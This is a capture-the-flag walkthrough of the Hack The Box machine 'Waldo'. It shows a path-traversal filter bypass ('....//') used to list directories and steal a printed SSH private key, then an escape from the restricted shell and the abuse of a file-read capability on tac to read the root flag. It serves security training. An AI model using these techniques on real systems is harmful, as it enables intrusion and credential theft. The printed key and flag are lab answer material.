---
title: "[HTB] Machine: Waldo"
description: "[HTB] Machine: Waldo"
date: 2023-10-22
menu:
  sidebar:
    name: "[HTB] Machine: Waldo"
    identifier: htb-machine-Waldo
    parent: htb-machines-linux
    weight: 10
hero: images/waldo.png
tags: ["HTB", "docker", "php", "ssh", "rbash", "capabilities"]
---

# Waldo
## Enumeration
- `nmap`
```
└─$ nmap -Pn -sC -sV 10.10.10.87
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-22 20:00 BST
Stats: 0:03:49 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 72.30% done; ETC: 20:05 (0:01:28 remaining)
Stats: 0:09:53 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 99.99% done; ETC: 20:10 (0:00:00 remaining)
Nmap scan report for 10.10.10.87 (10.10.10.87)
Host is up (0.100s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 c4:ff:81:aa:ac:df:66:9e:da:e1:c8:78:00:ab:32:9e (RSA)
|   256 b3:e7:54:6a:16:bd:c9:29:1f:4a:8c:cd:4c:01:24:27 (ECDSA)
|_  256 38:64:ac:57:56:44:d5:69:de:74:a8:88:dc:a0:b4:fd (ED25519)
80/tcp   open     http           nginx 1.12.2
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: nginx/1.12.2
| http-title: List Manager
|_Requested resource was /list.html
8888/tcp filtered sun-answerbook

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 620.98 seconds
```

- Web server

![](./images/1.png)

## Foothold
- We can see bunch of requests

![](./images/2.png)

- We can see the files via `/dirRead.php`

![](./images/3.png)

- It looks like we can only read files from the same directory using `/fileRead.php`

![](./images/4.png)

- I'll check the source code using `fileRead.php`
```
└─$ curl -XPOST -s -d "file=fileRead.php" http://10.10.10.87/fileRead.php | jq -r .file
<?php


if($_SERVER['REQUEST_METHOD'] === "POST"){
        $fileContent['file'] = false;
        header('Content-Type: application/json');
        if(isset($_POST['file'])){
                header('Content-Type: application/json');
                $_POST['file'] = str_replace( array("../", "..\""), "", $_POST['file']);
                if(strpos($_POST['file'], "user.txt") === false){
                        $file = fopen("/var/www/html/" . $_POST['file'], "r");
                        $fileContent['file'] = fread($file,filesize($_POST['file']));  
                        fclose();
                }
        }
        echo json_encode($fileContent);
}

```
```
└─$ curl -XPOST -s -d "file=dirRead.php" http://10.10.10.87/fileRead.php | jq -r .file
<?php

if($_SERVER['REQUEST_METHOD'] === "POST"){
        if(isset($_POST['path'])){
                header('Content-type: application/json');
                $_POST['path'] = str_replace( array("../", "..\""), "", $_POST['path']);
                echo json_encode(scandir("/var/www/html/" . $_POST['path']));
        }else{
                header('Content-type: application/json');
                echo '[false]';
        }
}

```

- We have a filter `str_replace( array("../", "..\""), "", $_POST['<FILE|PATH>']);`
  - We could bypass it via `....//`, since the check happens once
```
└─$ curl -XPOST -s -d "path=....//....//....//" http://10.10.10.87/dirRead.php | jq -r      
[
  ".",
  "..",
  ".dockerenv",
  "bin",
  "dev",
  "etc",
  "home",
  "lib",
  "media",
  "mnt",
  "proc",
  "root",
  "run",
  "sbin",
  "srv",
  "sys",
  "tmp",
  "usr",
  "var"
]               
```

- Let's check users and their home directories
```
└─$ curl -XPOST -s -d "path=....//....//....//home/nobody/.ssh" http://10.10.10.87/dirRead.php | jq -r 
[
  ".",
  "..",
  ".monitor",
  "authorized_keys",
  "known_hosts"
]  
```

- Strange file `.monitor`, which is private key
```
└─$ curl -XPOST -s -d "file=....//....//....//home/nobody/.ssh/.monitor" http://10.10.10.87/fileRead.php | jq -r .file
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAs7sytDE++NHaWB9e+NN3V5t1DP1TYHc+4o8D362l5Nwf6Cpl
mR4JH6n4Nccdm1ZU+qB77li8ZOvymBtIEY4Fm07X4Pqt4zeNBfqKWkOcyV1TLW6f
87s0FZBhYAizGrNNeLLhB1IZIjpDVJUbSXG6s2cxAle14cj+pnEiRTsyMiq1nJCS
dGCc/gNpW/AANIN4vW9KslLqiAEDJfchY55sCJ5162Y9+I1xzqF8e9b12wVXirvN
o8PLGnFJVw6SHhmPJsue9vjAIeH+n+5Xkbc8/6pceowqs9ujRkNzH9T1lJq4Fx1V
vi93Daq3bZ3dhIIWaWafmqzg+jSThSWOIwR73wIDAQABAoIBADHwl/wdmuPEW6kU
vmzhRU3gcjuzwBET0TNejbL/KxNWXr9B2I0dHWfg8Ijw1Lcu29nv8b+ehGp+bR/6
pKHMFp66350xylNSQishHIRMOSpydgQvst4kbCp5vbTTdgC7RZF+EqzYEQfDrKW5
8KUNptTmnWWLPYyJLsjMsrsN4bqyT3vrkTykJ9iGU2RrKGxrndCAC9exgruevj3q
1h+7o8kGEpmKnEOgUgEJrN69hxYHfbeJ0Wlll8Wort9yummox/05qoOBL4kQxUM7
VxI2Ywu46+QTzTMeOKJoyLCGLyxDkg5ONdfDPBW3w8O6UlVfkv467M3ZB5ye8GeS
dVa3yLECgYEA7jk51MvUGSIFF6GkXsNb/w2cZGe9TiXBWUqWEEig0bmQQVx2ZWWO
v0og0X/iROXAcp6Z9WGpIc6FhVgJd/4bNlTR+A/lWQwFt1b6l03xdsyaIyIWi9xr
xsb2sLNWP56A/5TWTpOkfDbGCQrqHvukWSHlYFOzgQa0ZtMnV71ykH0CgYEAwSSY
qFfdAWrvVZjp26Yf/jnZavLCAC5hmho7eX5isCVcX86MHqpEYAFCecZN2dFFoPqI
yzHzgb9N6Z01YUEKqrknO3tA6JYJ9ojaMF8GZWvUtPzN41ksnD4MwETBEd4bUaH1
/pAcw/+/oYsh4BwkKnVHkNw36c+WmNoaX1FWqIsCgYBYw/IMnLa3drm3CIAa32iU
LRotP4qGaAMXpncsMiPage6CrFVhiuoZ1SFNbv189q8zBm4PxQgklLOj8B33HDQ/
lnN2n1WyTIyEuGA/qMdkoPB+TuFf1A5EzzZ0uR5WLlWa5nbEaLdNoYtBK1P5n4Kp
w7uYnRex6DGobt2mD+10cQKBgGVQlyune20k9QsHvZTU3e9z1RL+6LlDmztFC3G9
1HLmBkDTjjj/xAJAZuiOF4Rs/INnKJ6+QygKfApRxxCPF9NacLQJAZGAMxW50AqT
rj1BhUCzZCUgQABtpC6vYj/HLLlzpiC05AIEhDdvToPK/0WuY64fds0VccAYmMDr
X/PlAoGAS6UhbCm5TWZhtL/hdprOfar3QkXwZ5xvaykB90XgIps5CwUGCCsvwQf2
DvVny8gKbM/OenwHnTlwRTEj5qdeAM40oj/mwCDc6kpV1lJXrW2R5mCH9zgbNFla
W0iKCBUAm5xZgU/YskMsCBMNmA8A5ndRWGFEFE+VGDVPaRie0ro=
-----END RSA PRIVATE KEY-----
```

- Connect with `ssh` key
```
└─$ ssh nobody@10.10.10.87 -i id_rsa              
Warning: Permanently added '10.10.10.87' (ED25519) to the list of known hosts.
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <http://wiki.alpinelinux.org>.
waldo:~$ 

```

## User 
- We saw `dockerenv` file, so it could be a container
  - We also have docker interface, which further suggests it
```
waldo:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 00:50:56:b9:3d:46 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.87/24 brd 10.10.10.255 scope global ens192
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN 
    link/ether 02:42:ec:91:3e:18 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever

```

- Listening ports 
```
waldo:~$ netstat -tulpn
netstat: can't scan /proc - are you root?
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -
tcp        0      0 :::80                   :::*                    LISTEN      -
tcp        0      0 :::22                   :::*                    LISTEN      -
tcp        0      0 :::8888                 :::*                    LISTEN      -

```

- If we check `/etc/ssh/sshd_config`, we see that `ssh` uses port `8888`
```
#       $OpenBSD: sshd_config,v 1.101 2017/03/14 07:19:07 djm Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/bin:/usr/bin:/sbin:/usr/sbin

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

Port 8888
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::
...
```

- It's quite possible that it has port forwarding configured
  - The private key `.monitor`, but there are no users with that name
  - Let's try to `ssh` using the same key again, but as `monitor` user
```
waldo:~$ ssh -i /home/nobody/.ssh/.monitor monitor@localhost
Linux waldo 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1 (2018-04-29) x86_64
           &.                                                                  
          @@@,@@/ %                                                            
       #*/%@@@@/.&@@,                                                          
   @@@#@@#&@#&#&@@@,*%/                                                        
   /@@@&###########@@&*(*                                                      
 (@################%@@@@@.     /**                                             
 @@@@&#############%@@@@@@@@@@@@@@@@@@@@@@@@%((/                               
 %@@@@%##########&@@@....                 .#%#@@@@@@@#                         
 @@&%#########@@@@/                        */@@@%(((@@@%                       
    @@@#%@@%@@@,                       *&@@@&%(((#((((@@(                      
     /(@@@@@@@                     *&@@@@%((((((((((((#@@(                     
       %/#@@@/@ @#/@          ..@@@@%(((((((((((#((#@@@@@@@@@@@@&#,            
          %@*(@#%@.,       /@@@@&(((((((((((((((&@@@@@@&#######%%@@@@#    &    
        *@@@@@#        .&@@@#(((#(#((((((((#%@@@@@%###&@@@@@@@@@&%##&@@@@@@/   
       /@@          #@@@&#(((((((((((#((@@@@@%%%%@@@@%#########%&@@@@@@@@&     
      *@@      *%@@@@#((((((((((((((#@@@@@@@@@@%####%@@@@@@@@@@@@###&@@@@@@@&  
      %@/ .&%@@%#(((((((((((((((#@@@@@@@&#####%@@@%#############%@@@&%##&@@/   
      @@@@@@%(((((((((((##(((@@@@&%####%@@@%#####&@@@@@@@@@@@@@@@&##&@@@@@@@@@/
     @@@&(((#((((((((((((#@@@@@&@@@@######@@@###################&@@@&#####%@@* 
     @@#(((((((((((((#@@@@%&@@.,,.*@@@%#####@@@@@@@@@@@@@@@@@@@%####%@@@@@@@@@@
     *@@%((((((((#@@@@@@@%#&@@,,.,,.&@@@#####################%@@@@@@%######&@@.
       @@@#(#&@@@@@&##&@@@&#@@/,,,,,,,,@@@&######&@@@@@@@@&&%######%@@@@@@@@@@@
        @@@@@@&%&@@@%#&@%%@@@@/,,,,,,,,,,/@@@@@@@#/,,.*&@@%&@@@@@@&%#####%@@@@.
          .@@@###&@@@%%@(,,,%@&,.,,,,,,,,,,,,,.*&@@@@&(,*@&#@%%@@@@@@@@@@@@*   
            @@%##%@@/@@@%/@@@@@@@@@#,,,,.../@@@@@%#%&@@@@(&@&@&@@@@(           
            .@@&##@@,,/@@@@&(.  .&@@@&,,,.&@@/         #@@%@@@@@&@@@/          
           *@@@@@&@@.*@@@          %@@@*,&@@            *@@@@@&.#/,@/          
          *@@&*#@@@@@@@&     #@(    .@@@@@@&    ,@@@,    @@@@@(,@/@@           
          *@@/@#.#@@@@@/    %@@@,   .@@&%@@@     &@&     @@*@@*(@@#            
           (@@/@,,@@&@@@            &@@,,(@@&          .@@%/@@,@@              
             /@@@*,@@,@@@*         @@@,,,,,@@@@.     *@@@%,@@**@#              
               %@@.%@&,(@@@@,  /&@@@@,,,,,,,%@@@@@@@@@@%,,*@@,#@,              
                ,@@,&@,,,,(@@@@@@@(,,,,,.,,,,,,,,**,,,,,,.*@/,&@               
                 &@,*@@.,,,,,..,,,,&@@%/**/@@*,,,,,&(.,,,.@@,,@@               
                 /@%,&@/,,,,/@%,,,,,*&@@@@@#.,,,,,.@@@(,,(@@@@@(               
                  @@*,@@,,,#@@@&*..,,,,,,,,,,,,/@@@@,*(,,&@/#*                 
                  *@@@@@(,,@*,%@@@@@@@&&#%@@@@@@@/,,,,,,,@@                    
                       @@*,,,,,,,,,.*/(//*,..,,,,,,,,,,,&@,                    
                        @@,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,@@                     
                        &@&,,,,,,,,,,,,,,,,,,,,,,,,,,,,&@#                     
                         %@(,,,,,,,,,,,,,,,,,,,,,,,,,,,@@                      
                         ,@@,,,,,,,,@@@&&&%&@,,,,,..,,@@,                      
                          *@@,,,,,,,.,****,..,,,,,,,,&@@                       
                           (@(,,,.,,,,,,,,,,,,,,.,,,/@@                        
                           .@@,,,,,,,,,,,,,...,,,,,,@@                         
                            ,@@@,,,,,,,,,,,,,,,,.(@@@                          
                              %@@@@&(,,,,*(#&@@@@@@,     
                              
                            Here's Waldo, where's root?
Last login: Tue Jul 24 08:09:03 2018 from 127.0.0.1
-rbash: alias: command not found
monitor@waldo:~$ 
```
## Root
- We are inside restricted shell
```
monitor@waldo:~$ cd /
-rbash: cd: restricted
```

- We can see the list of commands we can use
```
monitor@waldo:~$ ls -lha bin
total 8.0K
dr-xr-x--- 2 root monitor 4.0K Sep  8  2022 .
drwxr-x--- 5 root monitor 4.0K Sep  8  2022 ..
lrwxrwxrwx 1 root root       7 May  3  2018 ls -> /bin/ls
lrwxrwxrwx 1 root root      13 May  3  2018 most -> /usr/bin/most
lrwxrwxrwx 1 root root       7 May  3  2018 red -> /bin/ed
lrwxrwxrwx 1 root root       9 May  3  2018 rnano -> /bin/nano
```

- If we open `/etc/passwd` with `rnano`, we see that we have `/bin/rbash` as our shell
  - We can escape it by adding `-t "bash --noprofile"` when connecting via `ssh`
```
waldo:~$ ssh -i /home/nobody/.ssh/.monitor monitor@localhost -t "bash --noprofile"
monitor@waldo:~$ ls /etc
adduser.conf            bluetooth             debconf.conf            fstab        hostname         issue.net        logcheck        modprobe.d      pam.conf   rc0.d           rsyslog.conf  ssl                        ucf.conf
adjtime                 ca-certificates       debian_version          fuse.conf    hosts            kernel           login.defs      modules         pam.d      rc1.d           rsyslog.d     staff-group-for-usr-local  udev
alternatives            ca-certificates.conf  default                 gai.conf     hosts.allow      kernel-img.conf  logrotate.conf  modules-load.d  passwd     rc2.d           securetty     subgid                     ufw
anacrontab              calendar              deluser.conf            groff        hosts.deny       ldap             logrotate.d     motd            passwd-    rc3.d           security      subgid-                    update-motd.d
apm                     console-setup         dhcp                    group        ifplugd          ld.so.cache      machine-id      mtab            perl       rc4.d           selinux       subuid                     vim
apt                     cron.d                dictionaries-common     group-       init             ld.so.conf       magic           nanorc          profile    rc5.d           services      subuid-                    vmware-tools
avahi                   cron.daily            discover.conf.d         grub.d       init.d           ld.so.conf.d     magic.mime      network         profile.d  rc6.d           sgml          sysctl.conf                wgetrc
bash.bashrc             cron.hourly           discover-modprobe.conf  gshadow      initramfs-tools  libaudit.conf    mailcap         networks        protocols  rcS.d           shadow        sysctl.d                   wpa_supplicant
bash_completion         cron.monthly          docker                  gshadow-     inputrc          libnl-3          mailcap.order   newt            python     reportbug.conf  shadow-       systemd                    X11
bash_completion.d       crontab               dpkg                    gss          iproute2         locale.alias     manpath.config  nsswitch.conf   python2.7  resolv.conf     shells        terminfo                   xdg
bindresvport.blacklist  cron.weekly           emacs                   hdparm.conf  iptables         locale.gen       mime.types      opt             python3    rmt             skel          timezone                   xml
binfmt.d                dbus-1                environment             host.conf    issue            localtime        mke2fs.conf     os-release      python3.5  rpc             ssh           tmpfiles.d
monitor@waldo:~$ cd /
monitor@waldo:/$ 

```

- We need to export `PATH` to use commands
```
monitor@waldo:/$ id
bash: id: command not found
monitor@waldo:/$ export PATH=/root/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
monitor@waldo:/$ id
uid=1001(monitor) gid=1001(monitor) groups=1001(monitor)
monitor@waldo:/$ 
```

- We saw `app-dev` folder inside `monitor`'s home directory
```
monitor@waldo:~/app-dev$ ls -lha
total 2.2M
drwxrwx--- 3 app-dev monitor 4.0K Sep  8  2022 .
drwxr-x--- 5 root    monitor 4.0K Sep  8  2022 ..
-rwxrwx--- 1 app-dev monitor  14K Jul 24  2018 logMonitor
-r--r----- 1 app-dev monitor  14K May  3  2018 logMonitor.bak
-rw-rw---- 1 app-dev monitor 2.7K May  3  2018 logMonitor.c
-rw-rw---- 1 app-dev monitor  488 May  3  2018 logMonitor.h
-rw-rw---- 1 app-dev monitor 2.2M May  3  2018 logMonitor.h.gch
-rw-rw---- 1 app-dev monitor 6.7K May  3  2018 logMonitor.o
-rwxr----- 1 app-dev monitor  266 May  3  2018 makefile
-r-xr-x--- 1 app-dev monitor  795 May  3  2018 .restrictScript.sh
drwxr-x--- 2 app-dev monitor 4.0K Sep  8  2022 v0.1
monitor@waldo:~/app-dev$ ls -lha v0.1/
total 24K
drwxr-x--- 2 app-dev monitor 4.0K Sep  8  2022 .
drwxrwx--- 3 app-dev monitor 4.0K Sep  8  2022 ..
-r-xr-x--- 1 app-dev monitor  14K May  3  2018 logMonitor-0.1
```

- If we open a source code, it allows to read logs
  - But no `suid` set, so it probably due to [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)
    - `CAP_DAC_READ_SEARCH - Bypass file read permission checks and directory read and execute permission checks;`
    - `+ei`
      - `(e)ffective - used by the kernel to perform permission checks`
      - `(i) inheritable - preserved across execve or fork calls`
```
monitor@waldo:~/app-dev$ getcap v0.1/logMonitor-0.1 
v0.1/logMonitor-0.1 = cap_dac_read_search+ei
```

- If we look for other files with capabilities we find `tac`, which we can use to read the `root.txt`
```
monitor@waldo:~/app-dev$ find / -exec getcap {} \; 2>/dev/null
/usr/bin/tac = cap_dac_read_search+ei
/home/monitor/app-dev/v0.1/logMonitor-0.1 = cap_dac_read_search+ei
```
```
monitor@waldo:~/app-dev$ tac /root/root.txt | tac
48baee179d7cc099b111f3ded2191450
```